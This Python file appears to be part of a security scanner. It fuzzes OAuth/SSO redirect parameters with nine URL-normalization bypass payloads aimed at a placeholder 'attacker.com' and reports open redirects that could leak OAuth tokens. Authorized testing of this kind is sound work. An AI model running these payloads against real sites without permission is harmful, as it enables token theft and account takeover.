import requests
from rich.console import Console
import re
import urllib.parse

console = Console()

def check_oauth_redirect_bypass(url, headers=None):
    """
    OAuth / SSO Redirect URI Bypass Fuzzer.
    Identifies endpoints taking a 'redirect_uri', 'returnTo', or 'next' parameter
    and tests exotic URL normalization bugs to leak OAuth tokens or cause Open Redirects.
    """
    console.print(f"[bold cyan][*] Scanning for OAuth Redirect URI Bypasses: {url}[/bold cyan]")
    
    findings = []
    
    # We are looking for URLs that have redirect parameters
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    
    redirect_params = ["redirect_uri", "returnTo", "next", "callback", "redirect_url", "target"]
    target_param = None
    original_value = None
    
    for rp in redirect_params:
        if rp in qs:
            target_param = rp
            original_value = qs[rp][0]
            break
            
    if not target_param:
        console.print("[dim]- No OAuth redirect parameters found in URL. Skipping.[/dim]")
        return findings

    console.print(f"[dim]- Found redirect parameter '{target_param}' with value '{original_value}'[/dim]")
    
    # If the original value isn't a full URL, we extract its base
    base_target = "example.com"
    if "://" in original_value:
        base_target = urllib.parse.urlparse(original_value).netloc

    attacker_domain = "attacker.com"
    
    # Exotic bypass payloads (Browser Normalization, Regex bypasses, Node.js parser bugs)
    payloads = [
        f"https://{base_target}.{attacker_domain}",
        f"https://{base_target}@{attacker_domain}",
        f"https://{base_target}\\{attacker_domain}",
        f"https://{base_target}%252f@{attacker_domain}",
        f"https://{base_target}%09.{attacker_domain}",
        f"https://{attacker_domain}?{base_target}",
        f"https://{attacker_domain}#{base_target}",
        f"https://{attacker_domain}%23@{base_target}",
        f"https://{attacker_domain}\t@{base_target}"
    ]
    
    for payload in payloads:
        # Construct new query string
        new_qs = qs.copy()
        new_qs[target_param] = payload
        new_query_string = urllib.parse.urlencode(new_qs, doseq=True)
        
        test_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query_string, parsed.fragment))
        
        try:
            # We don't want to follow redirects immediately so we can inspect the Location header
            r = requests.get(test_url, headers=headers, allow_redirects=False, timeout=5)
            
            if r.status_code in [301, 302, 303, 307, 308]:
                location = r.headers.get("Location", "")
                if attacker_domain in location and base_target not in urllib.parse.urlparse(location).netloc:
                    console.print(f"[bold red][!] CRITICAL: OAuth Redirect Bypass / Open Redirect successful![/bold red]")
                    console.print(f"[bold red]    Payload: {payload}[/bold red]")
                    console.print(f"[bold red]    Location: {location}[/bold red]")
                    findings.append(f"OAuth Redirect Bypass: {test_url} -> {location}")
        except:
            pass

    if not findings:
        console.print("[green][+] No OAuth Redirect bypasses detected.[/green]")
        
    return findings
